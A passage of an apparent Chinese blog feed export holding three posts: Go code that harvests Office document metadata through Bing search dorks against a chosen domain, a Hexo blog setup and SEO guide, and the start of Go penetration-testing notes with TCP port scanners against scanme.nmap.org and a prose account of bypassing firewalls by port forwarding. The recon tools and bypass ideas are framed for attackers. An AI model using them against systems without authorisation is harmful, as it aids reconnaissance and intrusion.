class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(f *zip.File, prop <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">rc, err := f.Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rc.Close()</span><br><span class="line"><span class="keyword">if</span> err := xml.NewDecoder(rc).Decode(&amp;prop); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewProperties</span><span class="params">(r *zip.Reader)</span></span> (*OfficeCoreProperty, *OfficeAppProperty, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> coreProps OfficeCoreProperty</span><br><span class="line"><span class="keyword">var</span> appProps OfficeAppProperty</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> r.File &#123;</span><br><span class="line"><span class="keyword">switch</span> f.Name &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;docProps/core.xml&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> err := process(f, &amp;coreProps); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;docProps/app.xml&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> err := process(f, &amp;appProps); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;coreProps, &amp;appProps, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>NewProperties()</code>接受了一个<code>* zio.Reader</code>的参数，它表示<code>Zip归档</code>文件的<code>io.Reader</code>，使用<code>io.Reader</code>实例，遍历归档文件类型，中所有文件并检查文件名，如果文件名与两个属性文件名中任意一个匹配，则调用函数<code>process()</code>，并且传入文件要和填充的任意两个结构体类型:<code>OfficeCoreProperty</code>或者<code>OfficeAppProperty</code></p><p>函数<code>process</code>接受两个参数，<code>* zip.file</code> 和 <code>interface</code>。此代码接受通用的<code>interface()</code>类型，以允许将文件内容赋给任何数据类型，因为在<code>process</code>中没有特定的数据类型，增加了代码的重用性。在函数内，代码读取文件的内容并将<code>XML</code>数据解码为<code>结构体</code>。</p><h3 id="4-使用Bing搜索和接受文件"><a href="#4-使用Bing搜索和接受文件" class="headerlink" title="4. 使用Bing搜索和接受文件"></a>4. 使用<code>Bing</code>搜索和接受文件</h3><p>现在，我们已经有了打开，读取，解析和提取<code>Office Open Xml</code>文档需要的所有代码，并且知道我们接下来要做什么</p><ol><li>使用适当的过滤器向<code>Bing</code>提交搜索请求以检索目标结果</li><li>从HTML响应中提取<code>HREF(链接)</code>数据以获得文档的导向URL</li><li>为每个导向文档URL提交一个HTTP请求</li><li>解析响应正文以创建<code>zip.Reader</code></li><li>将<code>zip.Reader</code>传递到我们已经开发的代码中以提取元数据</li></ol><blockquote><p>site: 用于过滤特定的域结果</p><p>fileType: 用于根据资源文件类型过滤结果</p><p>instreamset：用于过滤结果以仅包含某些文件扩展名</p></blockquote><p>例如：从<code>nytimes.com</code>中检索<code>docx</code>文件的查询示例：</p><blockquote><p>site:nytimes.com &amp;&amp; filetype: docx &amp;&amp;instreamset:(url title):docx</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302112348.png"></p><p>接下来，我们要做的是确定<code>文档链接</code>在文档对象模型(DOM)中的位置，可以使用F12进行查看。</p><p>有了这些，我们就可以使用<code>goquery</code>来进行提取与<code>HTML</code>路劲匹配的所有数据元素</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;archive/zip&quot;</span></span><br><span class="line"><span class="string">&quot;bing/metadata&quot;</span></span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/PuerkitoBio/goquery&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(i <span class="type">int</span>, s *goquery.Selection)</span></span> &#123;</span><br><span class="line">url, ok := s.Find(<span class="string">&quot;a&quot;</span>).Attr(<span class="string">&quot;href&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;%d: %s\n&quot;</span>, i, url)</span><br><span class="line">res, err := http.Get(url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf, err := ioutil.ReadAll(res.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line">r, err := zip.NewReader(bytes.NewReader(buf), <span class="type">int64</span>(<span class="built_in">len</span>(buf)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cp, ap, err := metadata.NewProperties(r)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Printf(</span><br><span class="line"><span class="string">&quot;%21s %s - %s %s\n&quot;</span>,</span><br><span class="line">cp.Creator,</span><br><span class="line">cp.LastModifiedBy,</span><br><span class="line">ap.Application,</span><br><span class="line">ap.GetMajorVersion())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">3</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Missing required argument. Usage: main.go &lt;domain&gt; &lt;ext&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">domain := os.Args[<span class="number">1</span>]</span><br><span class="line">filetype := os.Args[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">q := fmt.Sprintf(</span><br><span class="line"><span class="string">&quot;site:%s &amp;&amp; filetype:%s &amp;&amp; instreamset:(url title):%s&quot;</span>,</span><br><span class="line">domain,</span><br><span class="line">filetype,</span><br><span class="line">filetype)</span><br><span class="line"></span><br><span class="line">search := fmt.Sprintf(<span class="string">&quot;http://www.bing.com/search?q=%s&quot;</span>, url.QueryEscape(q))</span><br><span class="line">res, err := http.Get(search)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">doc, err := goquery.NewDocumentFromReader(res.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">s := <span class="string">&quot;html body div#b_content ol#b_results li.b_algo h2&quot;</span></span><br><span class="line">doc.Find(s).Each(handler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">对Go渗透测试中的一些学习</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>博客搭建</title>
    <link href="https://h0ld1rs.github.io/posts/26832.html"/>
    <id>https://h0ld1rs.github.io/posts/26832.html</id>
    <published>2022-03-01T10:46:08.000Z</published>
    <updated>2022-03-01T10:47:54.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="懒人搭建博客"><a href="#懒人搭建博客" class="headerlink" title="懒人搭建博客"></a>懒人搭建博客</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想重启博客这个东西，发一些自己写的笔记啥的，由于重装系统之后之前的东西都不见了，所以，，还得重新来一下(xdm，一定要做好备份啊，不要憨憨的不备份重装系统)</p><p>搭建其实还是使用最简单的<code>hexo + butterfly</code>搭建的，没有什么难点，主要是遇到了一个在<code>butterfly</code>主题修改<code>_config.yml</code>的时候，有一个背景图片始终无法加载成功，但是在本地预览的时候是可以正常访问的，在<code>hexo d</code>后则是不能访问，在把<code>public</code>文件夹放置公网后发现，发现应该是<code>nodejs</code>版本的问题，最后解决成功了，，(菜鸡花了两天时间)</p><p>这里就放一下用到的命令和对应的版本吧</p><blockquote><p>#需要安装的东西<br>npm install –save hexo-deployer-git<br>npm install –save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</p><p>#主题</p><p>git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;Butterfly</p><p>#环境</p><p>npm 8.3.1<br>node v16.14.0<br>hexo-cli: 4.3.0<br>os: win32 10.0.22000<br>node: 16.14.0<br>v8: 9.4.146.24-node.20<br>uv: 1.43.0<br>zlib: 1.2.11<br>brotli: 1.0.9<br>ares: 1.18.1<br>modules: 93<br>nghttp2: 1.45.1<br>napi: 8<br>llhttp: 6.0.4<br>openssl: 1.1.1m+quic<br>cldr: 40.0<br>icu: 70.1<br>tz: 2021a3<br>unicode: 14.0<br>ngtcp2: 0.1.0-DEV<br>nghttp3: 0.1.0-DEV</p></blockquote><p>新手搭建博客请看：<a href="https://yafine-blog.cn/posts/4ab2.html">https://yafine-blog.cn/posts/4ab2.html</a></p><p>nodejs 使用了某文章师傅提到的<code>nvm</code>，有兴趣的师傅可以了解一下，和<code>jenv</code>差不多效果的东西</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301100318.png"></p><h2 id="图片问题"><a href="#图片问题" class="headerlink" title="图片问题"></a>图片问题</h2><p>解决图片我使用了<code>picgo</code>，可以直接转换成<code>markdown</code>形式的图片</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301112311.png"></p><h2 id="后端评论区通知"><a href="#后端评论区通知" class="headerlink" title="后端评论区通知"></a>后端评论区通知</h2><p>这里试了好些方法，有下面几位师傅的链接</p><p><code>Valine</code> :  <a href="https://blog.csdn.net/weixin_34434736/article/details/113047474">https://blog.csdn.net/weixin_34434736/article/details/113047474</a></p><p>​            <a href="https://blog.lete114.top/article/Valine-LeanCloud-Config.html">https://blog.lete114.top/article/Valine-LeanCloud-Config.html</a></p><p>​    使用这种方法应该不错，但是我又找了找，选择了另外一种方法</p><p><code>Twikoo+腾讯云评论配置</code>：这个我选择了<code>Server酱</code>发送消息</p><p>​    <a href="https://xiaoliblog.cn/page/comments.html#%E8%A7%86%E9%A2%91%E8%A7%82%E7%9C%8B">https://xiaoliblog.cn/page/comments.html#%E8%A7%86%E9%A2%91%E8%A7%82%E7%9C%8B</a></p><p>整体来说比较简单，效果也很好</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301095948.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301100017.png"></p><h2 id="url优化"><a href="#url优化" class="headerlink" title="url优化"></a>url优化</h2><p>一般来说，SEO搜索引擎优化认为，网站的最佳结构是 <strong>用户从首页点击三次就可以到达任何一个页面</strong>，但是我们使用<code>Hexo</code>编译的站点结构的<code>URL</code>是：<code>域名/年/月/日/文章标题</code>四层的结构，这样的<code>URL</code>结构很不利于<code>SEO</code>，爬虫就会经常爬不到我们的文章，于是，我们需要优化一下网站文章的<code>URL</code></p><h3 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a><strong>方案一</strong>：</h3><p>直接改成<code>域名/文章标题</code>的形式，在<code>Hexo配置文件</code>中修改<code>permalink</code>如下：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://blog.sky03.cn</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:title.html</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br></pre></td></tr></table></figure><p><strong>这个方式有个不好的地方：</strong></p><p>直接以<code>文章的标题</code>作为URL，而我们所写的文章的标题一般都是中文，但是URL只能用字母数字和标点符号表示，所以中文的URL只能被转义成一堆符号，而且还特别长。</p><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>插件</p><p>插件作用：自动为每篇文章生成一串数字作每篇文章的URI地址。每篇文章的<code>Front-matter</code>中会自动增加一个配置项：<code>abbrlink: xxxxx</code>，该项的值就是当前文章的URI地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo-abbrlink config 、固定文章地址插件</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc16</span>  <span class="comment">#算法选项：crc16、crc32，区别见之前的文章，这里默认为crc16丨crc32比crc16复杂一点，长一点</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">dec</span>    <span class="comment">#输出进制：十进制和十六进制，默认为10进制。丨dec为十进制，hex为十六进制</span></span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://blog.sky03.cn</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br></pre></td></tr></table></figure><h2 id="被谷歌和百度收录"><a href="#被谷歌和百度收录" class="headerlink" title="被谷歌和百度收录"></a>被谷歌和百度收录</h2><p>参考文章：<a href="https://blog.sky03.cn/posts/42790.html#toc-heading-25">https://blog.sky03.cn/posts/42790.html#toc-heading-25</a></p><p>谷歌好说，在谷歌网站站长把<code>github page</code>收录进去即可（<a href="https://search.google.com/search-console?%EF%BC%89">https://search.google.com/search-console?）</a></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301112215.png"></p><p><del>百度的话，(如果没有域名)目前为止好像很麻烦，就不弄了。</del></p><p>好像，，现在可以了？？，和谷歌收录的方法一样。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301150646.png"></p><p>那就等第二天过来看吧，，(百度搜索资源平台)</p><h2 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h2><ol><li>自动提交（分三种）<ul><li>主动推送</li><li>自动推送</li><li>sitemap（站点地图）</li></ul></li><li>手动提交<ul><li>即手动地将链接一次性提交给百度</li></ul></li></ol><p>一般自动提交比手动提交效果好一点，自动提交又从效率上来说：</p><p><strong>主动推送&gt;自动推送&gt;sitemap</strong></p><h3 id="自动提交的三种方法"><a href="#自动提交的三种方法" class="headerlink" title="自动提交的三种方法"></a>自动提交的三种方法</h3><ol><li><code>主动推送</code>：最为快速的提交方式。将站点当天新产出链接通过此方式推送给百度，以保证新链接可以及时被百度收录。</li><li><code>自动推送</code>：最为便捷的提交方式。将自动推送的JS代码部署在站点的每一个页面源代码中，当部署代码的页面在每次被浏览时，链接就会被自动推送给百度。可以与主动推送配合使用。</li><li><code>sitemap</code>：您可以定期将网站链接放到<code>sitemap文件</code>中，然后将<code>sitemap文件</code>提交给百度。百度会周期性的抓取检查您提交的<code>sitemap</code>，对其中的链接进行处理，但收录速度慢于主动推送。</li></ol><p>这里我选择主动推送，安装插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-baidu-url-submit --save</span><br></pre></td></tr></table></figure><p>然后打开<code>hexo配置文件</code>，在末尾加入以下配置：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo-baidu-url-submit  百度主动推送</span></span><br><span class="line"><span class="attr">baidu_url_submit:</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">80</span> <span class="comment"># 提交最新的一个链接</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">blog.sky03.cn</span> <span class="comment"># 在百度站长平台中注册的域名</span></span><br><span class="line">  <span class="attr">token:</span> <span class="string">xxxxxxx</span> <span class="comment"># 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">baidu_urls.txt</span> <span class="comment"># 文本文档的地址， 新链接会保存在此文本文档里</span></span><br></pre></td></tr></table></figure><p>再加入新的<code>deploy</code>：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">baidu_url_submitter</span></span><br></pre></td></tr></table></figure><p>到这里就完成了，，，等待明天的收录审核</p>]]></content>
    
    
    <summary type="html">重新打算开启博客，往上放电有用的东西</summary>
    
    
    
    <category term="奇奇怪怪" scheme="https://h0ld1rs.github.io/categories/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA/"/>
    
    
    <category term="博客搭建" scheme="https://h0ld1rs.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>go渗透测试笔记(二)</title>
    <link href="https://h0ld1rs.github.io/posts/31081.html"/>
    <id>https://h0ld1rs.github.io/posts/31081.html</id>
    <published>2022-02-18T13:37:21.000Z</published>
    <updated>2022-03-01T13:48:33.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-二-—TCP，扫描器和代理"><a href="#Go渗透测试笔记-二-—TCP，扫描器和代理" class="headerlink" title="Go渗透测试笔记(二)—TCP，扫描器和代理"></a>Go渗透测试笔记(二)—TCP，扫描器和代理</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>TCP是面向连接协议的主要标准，也是现代网络的基础。</p><p>作为攻击者，我们应当了解TCP的工作原理，并且能够开发可用的TCP结构体，以便可以识别 打开&#x2F;关闭 的端口，找出错误的结果。</p><p>如误判(syn-flood防护)以及通过端口转发绕过出口限制等等。</p><h2 id="0x01-理解TCP的握手机制"><a href="#0x01-理解TCP的握手机制" class="headerlink" title="0x01 理解TCP的握手机制"></a>0x01 理解TCP的握手机制</h2><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219190005.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219190050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219190247.png"></p><h2 id="0x02-通过端口转发绕过防火墙"><a href="#0x02-通过端口转发绕过防火墙" class="headerlink" title="0x02 通过端口转发绕过防火墙"></a>0x02 通过端口转发绕过防火墙</h2><p>企业组织可以配置防火墙，以防止客户端连接到某些服务器和端口，同时允许访问其他服务器和端口。我们可以使用中间系统代理连接绕过或者穿透防火墙，从而绕过这些限制。</p><blockquote><p>许多企业网络会限制内部资产建立与恶意站点的HTTP连接。假设有一个名为<code>evil.com</code>的恶意网站。如果有员工直接浏览evil.com，则浏览器会阻止，但是，如果员工拥有允许通过防火墙的外部系统，(如 stacktian.com)，则员工可以利用允许的域来反弹与<code>evil.com</code>的连接</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219191150.png"></p><p>可以使用端口转发绕过多种限制性网络配置，例如，可以通过跳箱转发流量，以访问网络或者访问绑定到限制性接口的端口</p><h2 id="0x03-编写一个TCP扫描器"><a href="#0x03-编写一个TCP扫描器" class="headerlink" title="0x03 编写一个TCP扫描器"></a>0x03 编写一个TCP扫描器</h2><h4 id="1-测试端口的可用性"><a href="#1-测试端口的可用性" class="headerlink" title="1. 测试端口的可用性"></a>1. 测试端口的可用性</h4><p>创建端口扫描器的第一步是了解如何启动从客户端到服务器组件的相连，在整个示例中，我们需要连接并扫描<code>scanme.nmap.org</code>，为此我们需要使用nmap的包：<code>net.Dial(network,address string)</code></p><p>第一个参数是一个字符串，用于识别标识要启动的连接类型，这是因为<code>Dial</code>不仅适用于TCP，还可以用于创建使用<code>Unix</code>套接字，UDP和第四层协议连接。</p><p>第二个参数需要连接的主机，对于<code>IPV4/TCP</code>连接，字符串使用<code>host:port</code>的形式进行连接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">_,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;scanme.nmap.org:80&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;连接成功&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-执行非并发扫描"><a href="#2-执行非并发扫描" class="headerlink" title="2. 执行非并发扫描"></a>2. 执行非并发扫描</h4><p>一次扫描一个端口没有什么用，TCP的端口为”1–65535”，作为测试，我们这里选择 1024，使用 <code>for</code>循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">1</span>; i&lt;=<span class="number">1024</span>; i++&#123;</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,i)</span><br><span class="line">fmt.Println(address)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>剩下的就是进行连接，我们还应该加入一些逻辑来关闭连接，这样就不会一直处于一个打开的状态，需要在Conn上调用Close()</p><blockquote><p>Sprintf：用传入的格式化规则符将传入的变量格式化，(终端中不会有显示)</p><p>Printf：用传入的格式化规则符将传入的变量写入到标准输出里面(即在终端中有显示)，</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">79</span>; i&lt;=<span class="number">100</span>; i++&#123;</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,i)</span><br><span class="line">conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,address)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//端口已关闭或者过滤</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>,i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-执行非并发扫描"><a href="#3-执行非并发扫描" class="headerlink" 